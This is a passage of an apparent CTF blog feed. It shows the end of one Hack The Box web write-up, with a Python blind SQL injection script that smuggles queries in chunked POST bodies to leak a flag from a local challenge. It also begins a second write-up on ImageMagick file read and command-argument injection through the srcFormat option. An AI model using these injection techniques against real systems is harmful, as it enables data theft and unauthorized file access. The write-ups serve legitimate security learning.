+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;HTTP_TRANSFER_ENCODING&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;HTTP_TRANSFER_ENCODING&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;chunked&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$search&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;search&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unsafequery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pdo&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$search&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$result&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;div class=&amp;#39;results&amp;#39;&amp;gt;No post id found.&amp;lt;/div&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">http_response_code&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;Internal Server Error&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>However, this is enough for blind SQL.
+We can iterate over the indices of the flag value, and compare each substring of length 1 at that index with another character, and make educated guesses about the value of the flag.
+Take a look at the following:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image from posts where id = &amp;#39;1&amp;#39; AND 1=1 ;--
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image from posts where id = &amp;#39;1&amp;#39; AND substr(&amp;#39;HTB&amp;#39;, 1, 1) = &amp;#39;H&amp;#39; ;--
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SELECT id, gamename, gamedesc, image FROM posts WHERE id = &amp;#39;1&amp;#39; AND substr((SELECT gamedesc FROM posts WHERE id = &amp;#39;6&amp;#39;), 1, 1) &amp;gt; &amp;#39;A&amp;#39; ;--
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>All of these statements will execute successfully, giving us the &lt;code>No post id found&lt;/code> message.&lt;/p>
+&lt;p>It&amp;rsquo;s just a slightly more convuluted basic SQL injection, but you base your guess of the flag value based on whether the second condition resolves to True or False.
+This is where leetcode comes in.
+So the flag can contain any value from 0x20 to 0x7f (that is just the readable ASCII range).
+So we can use a binary search algorithm to make a guess as to whether a character in the flag is greater or lesser than some mid range value.
+We just take the mid point of 0x20 and 0x75, create a query that will give us the &lt;code>No post id found&lt;/code> message if the flag letter is greater, or give us a 500 error if its not.
+Then we readjust the range, and keep repeating until only 1 character is left.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:1337&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PATH&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/Controllers/Handlers/SearchHandler.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">build_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;search=6&amp;#39; AND substr((SELECT gamedesc FROM posts where id = &amp;#39;6&amp;#39;), &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, 1) &amp;gt; &amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#39; ;--&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">query&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">query&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;0&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">make_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Transfer-Encoding&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;chunked&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">PATH&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">False&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">find_letter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">32&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">127&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">end&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">start&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">//&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">q&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">build_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mid&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">correct&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_request&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">correct&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mid&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[i] LEAKING FLAG: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">letter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="n">letter&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;}&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">letter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">find_letter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ctr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">letter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ctr&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>HTB WEB Prying Eyes</title><link>https://Kvn11.github.io/p/htb-web-prying-eyes/</link><pubDate>Sun, 29 Oct 2023 02:46:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-web-prying-eyes/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/hackthebox.jpg" alt="Featured image of post HTB WEB Prying Eyes" />&lt;blockquote>
+&lt;p>&lt;strong>Challenge Description&lt;/strong>: Welcome to the Prying Eyes, a &amp;ldquo;safe space&amp;rdquo; for those curious about the large organisations that dominate our life.
+How safe is the site really?&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="walkthrough">Walkthrough
+&lt;/h2>&lt;p>The challenge involves what seems to be a leaks forum / marketplace, very reminiscent of RaidForums (RIP).&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4.PNG"
+width="917"
+height="951"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/4_hu2daf908e9f049988721999c6f3a9721b_244231_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Home page of the challenge site"
+class="gallery-image"
+data-flex-grow="96"
+data-flex-basis="231px"
+>&lt;/p>
+&lt;p>Other than some interesting posts, doesn&amp;rsquo;t seem to be much else so I moved on to source code review at this point.
+Right away, I noticed that one of the pages was using &lt;code>Imagemagick&lt;/code> which is known to have tons of vulnerabilities.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5.PNG"
+width="746"
+height="241"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/5_hu6ad4e8bae519ff810e4c1a0e126ad256_43528_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Naughty naughty imagemagick"
+class="gallery-image"
+data-flex-grow="309"
+data-flex-basis="742px"
+>&lt;/p>
+&lt;p>&lt;code>Imagemagick-convert&lt;/code> is just a JavaScript interface for the &lt;code>convert&lt;/code> CLI tool from &lt;code>Imagemagick&lt;/code>, which according to the Dockerfile from the challenge is version &lt;code>7.1.0-33&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6.PNG"
+width="1118"
+height="291"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/6_hu3ae2305a1770b8206050f19eef824495_46868_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Its always suspicous when a single package uses a specific version"
+class="gallery-image"
+data-flex-grow="384"
+data-flex-basis="922px"
+>&lt;/p>
+&lt;p>A little googling brings us to this &lt;a class="link" href="https://github.com/Sybil-Scan/imagemagick-lfi-poc" target="_blank" rel="noopener"
+>exploit&lt;/a>.
+Generating the exploit is pretty straightforward, just follow the instructions from the script.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1.PNG"
+width="638"
+height="146"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/1_hu72318ef7ea01e31a4d300b1d9aafd248_21037_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Exploit generation"
+class="gallery-image"
+data-flex-grow="436"
+data-flex-basis="1048px"
+>&lt;/p>
+&lt;p>Now its important to note that the file read is only accessible if the output file of the &lt;code>convert&lt;/code> operation is a &lt;code>png&lt;/code>.
+I got stuck on this for quite a while, but looking at the source code for the forum revealed another vulnerability.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7.PNG"
+width="767"
+height="659"
+srcset="https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/htb-web-prying-eyes/img/7_hu9f7812283d4920cb8db22821c2c129ae_77464_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Why are we allowed to pass in arguments to a serverside CLI tool?"
+class="gallery-image"
+data-flex-grow="116"
+data-flex-basis="279px"
+>&lt;/p>
+&lt;p>The fact that we can pass in our own arguments through intercepting the post request implies there is an argument that we can use that will allow us to change the output file format.
+The source code for the convert function can be found here&lt;/p>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.npmjs.com/package/imagemagick-convert?activeTab=code" target="_blank" rel="noopener"
+>imagemagick-convert&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>The code pretty much just creates a command string that is then passed to a command process.
+The data from the uploaded image is passed through standard input, and our options are concatenated together.
+The intended command string is supposed to look like this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">convert &amp;lt;args&amp;gt; - AVIF:file_name
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>However, since it just concats whatever is passed to it without much processing, it allows for command injection.
+The output file name is the last arg to be concated to the string, so we just need an option that occurs before it.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * Create occurrence
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} format
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @param {string|null} name
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @returns {string}
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">createOccurrence&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">occurrence&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">format&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s1">&amp;#39;-&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">occurrence&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>For this purpose the &lt;code>srcFormat&lt;/code> option will work, especially because it is the argument that is inserted right before the output file name.
